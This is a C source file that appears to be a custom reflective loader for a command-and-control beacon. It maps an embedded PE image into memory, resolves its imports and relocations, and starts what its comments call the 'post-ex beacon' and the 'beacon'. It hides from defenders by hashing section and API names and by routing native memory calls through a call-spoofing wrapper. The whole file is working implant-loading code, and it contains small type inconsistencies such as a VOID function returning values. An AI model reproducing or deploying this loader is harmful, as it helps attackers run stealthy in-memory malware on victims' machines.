#include <windows.h>

#include "Instance.h"
#include "Prototypes.h"
#include "Macros.h"
#include "PreHash.h"
#include "Ntdll.h"
#include "Vulcan.h"

typedef struct {
    char* start;
    DWORD length;
    DWORD offset;
} RDATA_SECTION, *PRDATA_SECTION;


D_SEC(B)
BOOL GetRdataSection(
	_In_	PVOID					pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS		pNtHeader,
    _In_    PRDATA_SECTION          rdata
    )
{
	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);
    NTSTATUS    status = 0;

	for (DWORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
	{
        if(djb2A(pSecHeader[i].Name) == HASH_secRdata)
        {
            rdata->start = (PVOID)(U_PTR(pMemPeAddr) + pSecHeader[i].VirtualAddress);
            rdata->length = pSecHeader[i].SizeOfRawData;
            rdata->offset = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
            return TRUE;
        }

    }
	return FALSE;
}


/* -------------------------
    Main code
------------------------- */
D_SEC(B)
VOID Main(
    _In_ PVOID Param,
    _In_ PINSTANCE Inst
    )
{
  
    RDATA_SECTION   rData = { 0 };

    UINT_PTR uiMemPeAddr = U_PTR(Inst->Info.End);
    PIMAGE_DOS_HEADER pDosHeader = uiMemPeAddr;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(uiMemPeAddr + pDosHeader->e_lfanew);
    NTSTATUS status = 0;

    SIZE_T dwImgSize = pNtHeader->OptionalHeader.SizeOfImage;

    PVOID pMemPeAddr = NULL;

    status = SPOOF_CALL(Inst, Inst->NtAllocateVirtualMemory, NtCurrentProcess, &pMemPeAddr, 0, &dwImgSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        return FALSE;
    }


    CopySections(pMemPeAddr, pNtHeader, uiMemPeAddr);

    if (!ProcessImportTable(pMemPeAddr, pNtHeader, Inst))
        return;


    ApplyBaseRelocations(pMemPeAddr, pNtHeader);


    if (!PatchMemoryProtection(pMemPeAddr, pNtHeader, Inst))
        return;

    // Take rdata information and pass section in RW
    if(!GetRdataSection(pMemPeAddr, pNtHeader, &rData))
        return;

    void* pSectionAddr = rData.start;
    SIZE_T sectionSize = rData.length;
    ULONG_PTR oldProtect = 0;
    status = SPOOF_CALL(Inst, Inst->NtProtectVirtualMemory, NtCurrentProcess, &pSectionAddr, &sectionSize, PAGE_READWRITE, &oldProtect);
    if (!NT_SUCCESS(status))
    {
        return FALSE;
    }

    UINT_PTR entryPoint = ((ULONG_PTR)pMemPeAddr + pNtHeader->OptionalHeader.AddressOfEntryPoint);

    ((DLLMAIN)entryPoint)((HINSTANCE)pMemPeAddr, DLL_PROCESS_ATTACH, &rData); // Init post-ex beacon
    ((DLLMAIN)entryPoint)((HINSTANCE)&Main, 0x4, Param);                // Init beacon


    return &Main;
}
